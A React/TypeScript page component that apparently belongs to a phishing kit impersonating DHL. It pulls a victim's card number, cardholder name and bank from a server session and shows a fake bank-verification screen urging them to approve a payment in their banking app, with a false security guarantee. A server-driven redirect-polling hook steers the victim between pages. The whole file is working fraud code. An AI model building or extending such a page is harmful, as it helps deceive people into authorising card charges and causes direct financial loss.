import { useEffect, useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Building2, Smartphone, CheckCircle2 } from "lucide-react";
import { useRedirectPolling } from "@/hooks/use-redirect-polling";
import { useLanguage } from "@/hooks/use-language";

export default function DHLApprovePage() {
  const { t } = useLanguage();
  const [dots, setDots] = useState(".");
  const [bankName, setBankName] = useState("Votre Banque");
  const [cardLast4, setCardLast4] = useState("****");
  const [cardholderName, setCardholderName] = useState("");
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [paymentId, setPaymentId] = useState<string>("");


  // Get card logo based on bank name
  const getCardLogo = (name: string): string | null => {
    const logos: Record<string, string> = {
      "Visa": "/cards/visa.png",
      "Mastercard": "/cards/mastercard.png",
      "American Express": "/cards/amex.png",
      "JCB": "/cards/jcb.jpg",
    };
    return logos[name] || null;
  };

  useEffect(() => {
    const interval = setInterval(() => {
      setDots((prev) => (prev.length >= 3 ? "." : prev + "."));
    }, 500);

    // Get session data from URL
    const params = new URLSearchParams(window.location.search);
    const id = params.get("session");
    const pId = params.get("paymentId");
    
    if (id) {
      setSessionId(id);
      fetch(`/api/dhl/session/${id}`)
        .then(res => res.json())
        .then(data => {
          if (data.bankName) {
            setBankName(data.bankName);
          }
          if (data.cardNumber) {
            setCardLast4(data.cardNumber.slice(-4));
          }
          if (data.cardholderName) {
            setCardholderName(data.cardholderName);
          }
        })
        .catch(() => {});
    }
    if (pId) {
      setPaymentId(pId);
    }

    return () => clearInterval(interval);
  }, []);

  // Use redirect polling hook
  useRedirectPolling({
    sessionId,
    currentPath: "/approve",
    paymentId,
    apiEndpoint: "/api/dhl/session",
    pathEndpoint: "/api/dhl/session/:sessionId/path",
  });

  return (
    <div className="min-h-screen bg-gradient-to-br from-yellow-50 to-red-50 flex items-center justify-center p-4">
      <Card className="w-full max-w-md shadow-xl border-2 border-[#FFCC00]">
        <CardHeader className="space-y-4 text-center bg-gradient-to-r from-[#FFCC00] to-[#D40511] text-white pb-8">
          {/* Card Logo Only - Smaller size */}
          {getCardLogo(bankName) && (
            <div className="flex justify-center pt-4" data-testid="card-logo">
              <div className="bg-white rounded-lg px-4 py-3 shadow-lg">
                <img 
                  src={getCardLogo(bankName)!} 
                  alt={bankName} 
                  className="h-8 object-contain"
                />
              </div>
            </div>
          )}

          {/* Card Last 4 + Cardholder Name */}
          {cardholderName && (
            <div className="bg-white/10 backdrop-blur-sm border border-white/20 rounded-lg py-3 px-4 mx-8 mt-4" data-testid="card-info">
              <div className="text-white/90 text-sm font-medium mb-1">
                {t('bankCard')}
              </div>
              <div className="text-white text-lg font-bold tracking-wider">
                •••• {cardLast4}
              </div>
              <div className="text-white/80 text-sm mt-1 uppercase tracking-wide">
                {cardholderName}
              </div>
            </div>
          )}

          <CardTitle className="text-2xl font-bold pt-2">
            {t('bankVerification')}
          </CardTitle>
          <CardDescription className="text-white/90 text-base">
            {bankName} {t('bankConfirmation')}
          </CardDescription>
        </CardHeader>

        <CardContent className="pt-8 space-y-6">
          <div className="bg-green-50 border-2 border-green-300 rounded-lg p-6 text-center space-y-4">
            <div className="flex justify-center">
              <Smartphone className="h-16 w-16 text-green-600 animate-pulse" />
            </div>
            
            <div className="space-y-2">
              <p className="text-lg font-semibold text-green-900">
                {t('approveOnPhone')}
              </p>
              <p className="text-sm text-green-700">
                {t('checkBankingApp')}
              </p>
            </div>
          </div>

          <div className="space-y-3">
            <div className="flex items-start gap-3 p-3 bg-white border border-green-200 rounded-lg">
              <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm">
                <p className="font-medium text-gray-900">{t('step1Title')}</p>
                <p className="text-gray-600">{t('step1Desc')}</p>
              </div>
            </div>

            <div className="flex items-start gap-3 p-3 bg-white border border-green-200 rounded-lg">
              <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm">
                <p className="font-medium text-gray-900">{t('step2Title')}</p>
                <p className="text-gray-600">{t('step2Desc')}</p>
              </div>
            </div>

            <div className="flex items-start gap-3 p-3 bg-white border border-green-200 rounded-lg">
              <CheckCircle2 className="h-5 w-5 text-green-600 mt-0.5 flex-shrink-0" />
              <div className="text-sm">
                <p className="font-medium text-gray-900">{t('step3Title')}</p>
                <p className="text-gray-600">{t('step3Desc')}</p>
              </div>
            </div>
          </div>

          <div className="bg-gradient-to-r from-[#FFCC00] to-[#D40511] rounded-lg p-4 text-center">
            <div className="flex items-center justify-center gap-2 text-white">
              <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
              <p className="font-semibold">
                {t('waitingConfirmation')}{dots}
              </p>
            </div>
          </div>

          <div className="text-center text-sm text-gray-600 border-t pt-4 space-y-2">
            <p className="font-medium">{t('noNotification')}</p>
            <ul className="text-xs text-gray-500 space-y-1">
              <li>• {t('updateApp')}</li>
              <li>• {t('checkInternet')}</li>
              <li>• {t('contactBank')}</li>
            </ul>
          </div>

          <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 text-center">
            <p className="text-xs text-yellow-800">
              <strong>{t('dhlSecurity')}</strong> {t('securityGuarantee')}
            </p>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}
